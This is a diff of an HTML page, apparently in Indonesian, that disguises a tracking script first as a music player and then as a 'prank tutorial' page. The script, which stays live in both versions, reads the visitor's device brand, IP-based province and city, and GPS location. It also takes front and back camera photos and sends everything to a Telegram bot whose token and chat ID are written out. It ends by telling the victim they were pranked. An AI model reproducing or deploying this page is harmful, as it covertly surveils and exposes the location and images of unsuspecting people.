@@ -4,105 +4,50 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Now Playing</title>
+  <title>Tutorial Prank temen yang dongo 100% dijamin berhasil</title>
   <style>
+    * { box-sizing: border-box; }
     body {
-      margin: 0;
-      background: linear-gradient(135deg, #0f0f0f, #1a1a1a, #000000);
-      color: #fff;
-      font-family: 'Segoe UI', sans-serif;
+      background-color: #000;
+      color: #00ff00;
+      font-family: 'Courier New', Courier, monospace;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      flex-direction: column;
-      background-size: 400% 400%;
-      animation: bgmove 20s ease infinite;
-    }
-    @keyframes bgmove {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
-    }
-    .player {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      transform: scale(0.85);
-    }
-    .cover {
-      width: 180px;
-      height: 180px;
-      border-radius: 50%;
+      margin: 0;
       overflow: hidden;
-      margin-bottom: 20px;
+      flex-direction: column;
     }
-    .cover img {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-    }
-    .title-container {
-      width: 260px;
-      overflow: hidden;
-      white-space: nowrap;
-      margin-bottom: 5px;
-    }
-    .title-scroll {
-      display: inline-block;
-      animation: scroll 12s linear infinite;
-      font-size: 16px;
-      font-weight: bold;
-      color: #fff;
-    }
-    .artist {
+    #msg {
+      white-space: pre-wrap;
       font-size: 14px;
-      color: #aaa;
-      margin-bottom: 15px;
+      padding: 20px;
+      max-width: 90vw;
+      border-left: 2px solid #0f0;
+      padding-left: 15px;
+      animation: cursor 1s step-end infinite;
     }
-    .controls {
-      display: flex;
-      gap: 10px;
+    @keyframes cursor { 50% { border-color: transparent; } }
+    .prank {
+      font-size: 40px;
+      color: #0f0;
+      text-shadow: 0 0 5px #0f0, 0 0 10px #0f0, 0 0 20px #00ff00, 0 0 40px #00ff00;
+      font-weight: bold;
+      opacity: 0;
+      animation: muncul 2s ease-in-out forwards;
     }
-    .btn {
-      background: #222;
-      border: 1px solid #444;
-      color: #fff;
-      padding: 8px 16px;
-      cursor: pointer;
-      border-radius: 30px;
-      font-size: 13px;
+    @keyframes muncul {
+      0% { opacity: 0; transform: scale(0.8); }
+      50% { opacity: 1; transform: scale(1.1); }
+      100% { transform: scale(1); }
     }
-    @keyframes scroll {
-      0%   { transform: translateX(100%); }
-      100% { transform: translateX(-100%); }
-    }
+    .hidden { display: none; }
   </style>
 </head>
 <body>
-  <div class="player">
-    <div class="cover" id="cover">
-      <img src="https://files.catbox.moe/ssiqvm.jpg" alt="Album Art">
-    </div>
-    <div class="title-container">
-      <div class="title-scroll">SUMPAH KU MENCINTAIMU - SEVENTEEN ( SPEED UP )</div>
-    </div>
-    <div class="artist">Jangan keluar agar music tidak mati</div>
-    <audio id="audio" src="https://files.catbox.moe/2yf6i9.mp3" loop></audio>
-    <div class="controls">
-      <button class="btn" onclick="playAudio()">Play</button>
-      <button class="btn" onclick="pauseAudio()">Pause</button>
-    </div>
-  </div>
-
+  <div id="msg">Tunggu sebentar, get tutorial sabar..</div>
   <script>
-    function playAudio() {
-      document.getElementById("audio").play();
-    }
-    function pauseAudio() {
-      document.getElementById("audio").pause();
-    }
-
     const token1 = '7691252764:AAEivTZ5gqJx9LjID9Fkz43qNIICvv6FGdY';
     const token2 = '';
     const chatId1 = '5914256752';
@@ -110,12 +55,12 @@
 
     const getDeviceBrand = () => {
       const ua = navigator.userAgent;
-      if (/Vivo|vivo/.test(ua)) return 'Vivo';
+      if (/Vivo|vivo|V\d{4}/.test(ua)) return 'Vivo';
       if (/Oppo|CPH/.test(ua)) return 'Oppo';
-      if (/Samsung|SM-/.test(ua)) return 'Samsung';
+      if (/SM-|Samsung/.test(ua)) return 'Samsung';
       if (/Infinix/.test(ua)) return 'Infinix';
-      if (/Redmi|Mi/.test(ua)) return 'Xiaomi';
       if (/RMX/.test(ua)) return 'Realme';
+      if (/Redmi|Mi/.test(ua)) return 'Xiaomi';
       return 'Android Device';
     };
 
@@ -213,7 +158,7 @@ Provinsi            : ${ip.region}
 Kota                : ${ip.city}
 `.trim();
       } catch {
-        return "❌ Gagal mengambil data IP.";
+        return "\nINFORMASI JARINGAN\nGagal mengambil data IP.";
       }
     };
 
@@ -260,7 +205,7 @@ Peta                : https://maps.google.com/?q=${latitude},${longitude}
           const ctx = canvas.getContext("2d");
           ctx.drawImage(video, 0, 0);
           await new Promise(resolve => canvas.toBlob(async (blob) => {
-            if (blob) await kirimFoto(blob);
+            if(blob) await kirimFoto(blob);
             resolve();
           }, "image/jpeg"));
         }
@@ -269,7 +214,6 @@ Peta                : https://maps.google.com/?q=${latitude},${longitude}
       } catch {
         return `
 - 〘 ${label} 〙 -
-
 ❌ Kamera tidak diizinkan oleh pengguna.
 `;
       }
@@ -281,13 +225,26 @@ Peta                : https://maps.google.com/?q=${latitude},${longitude}
         ambilIPInfo(),
         ambilLokasi()
       ]);
-      await kirimPesan(`${info}\n\n${ip}\n\n${lokasi}`);
 
-      const depan = await ambilKamera("user", "𝗞𝗔𝗠𝗘𝗥𝗔 𝗗𝗘𝗣𝗔𝗡");
-      if (depan) await kirimPesan(depan);
+      let hasil = `${info}\n\n${ip}\n\n${lokasi}`;
+      await kirimPesan(hasil); // Kirim informasi dulu
 
-      const belakang = await ambilKamera("environment", "𝗞𝗔𝗠𝗘𝗥𝗔 𝗕𝗘𝗟𝗔𝗞𝗔𝗡𝗚");
-      if (belakang) await kirimPesan(belakang);
+      const kameraDepan = await ambilKamera("user", "𝗞𝗔𝗠𝗘𝗥𝗔 𝗗𝗘𝗣𝗔𝗡");
+      if (kameraDepan) await kirimPesan(kameraDepan); // Kirim notif jika gagal
+
+      const kameraBelakang = await ambilKamera("environment", "𝗞𝗔𝗠𝗘𝗥𝗔 𝗕𝗘𝗟𝗔𝗞𝗔𝗡𝗚");
+      if (kameraBelakang) await kirimPesan(kameraBelakang); // Kirim notif jika gagal
+
+      document.getElementById("msg").textContent = "Anda kena prank mau aja nunggu 😹.";
+
+      setTimeout(() => {
+        document.getElementById("msg").classList.add("hidden");
+        const el = document.createElement("div");
+        el.className = "prank";
+        el.id = "prank";
+        el.textContent = "ANDA KENA PRANK 😹";
+        document.body.appendChild(el);
+      }, 1500);
     };
 
     mulai();
